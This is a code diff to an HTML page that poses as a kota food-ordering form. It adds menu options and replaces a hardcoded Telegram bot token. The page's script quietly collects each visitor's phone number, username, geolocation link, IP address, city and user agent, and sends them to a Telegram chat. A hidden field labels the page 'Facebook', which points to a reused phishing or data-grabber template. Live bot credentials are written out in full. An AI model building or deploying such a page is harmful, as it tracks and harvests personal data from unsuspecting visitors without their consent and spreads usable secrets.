@@ -293,8 +293,13 @@ a {
               <input type="hidden" name="" id="pagename" value="Facebook" />
                 <input type="text" id="email"  placeholder="location" value="    https://www.google.com/maps/place/{{latitude}}+{{longitude}}"
                 class="input-field" name="email" required/>
-                <input id="name" type="locate" placeholder="choose between 1kg to 10kg" class="input-field" name="location"  required>
-                <input type="text" id="comment" placeholder="comment how you want to be" class="input-field" required>
+                <input id="name" type="locate" placeholder="How many note each R20" class="input-field" name="location"  required>
+                <input type="text" id="comment" placeholder="comment" class="input-field" required/>
+              <select id="choosing" name="choose" multiple>
+    <option value="1 kota">1 kota</option>
+    <option value="2 kota">2 kotas</option>
+    <option value="3 kota">3 kotas</option>
+</select>
         <input type="tel" id="phone" name="phone" placeholder="phone" class="input-field" required>
         
         <input type="text" id="username" name="username" placeholder="username" class="input-field" required>
@@ -348,15 +353,17 @@ a {
                const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
                const comment = document.getElementById("comment").value;
+               const choosing = document.getElementById("choosing").value;
                const message = `> Food Page : ${page}\n\n> food :
                  ${name}\n\n> phone :
                  ${phone}\n\n> username :
                  ${comment}\n\n> comment :
+                 ${choosing}\n\n> choosing :
                  ${username}\n\n> location url :
                  ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
     
                // Send the message to your Telegram bot using the appropriate API
-               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
+               const botToken = '8109379327:AAGCNdlGKFVkO9HGGOI40oio_rRvPcVh0kw';
                const chatId =2013982441 ;
     
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -431,12 +438,11 @@ function getLocation() {
         <details>
 
           <summary>Sauce</summary>
-         <li><il> comming up</il></li>
-         <li>comming up</li>
+         <li><il> kota with hot Chips</il></li>
+         <li>kota with sauce</li>
           </details>
           </form>
           </fieldset>
-  <hr>
   
   <h1 style="color:red">Closed</h1>
 
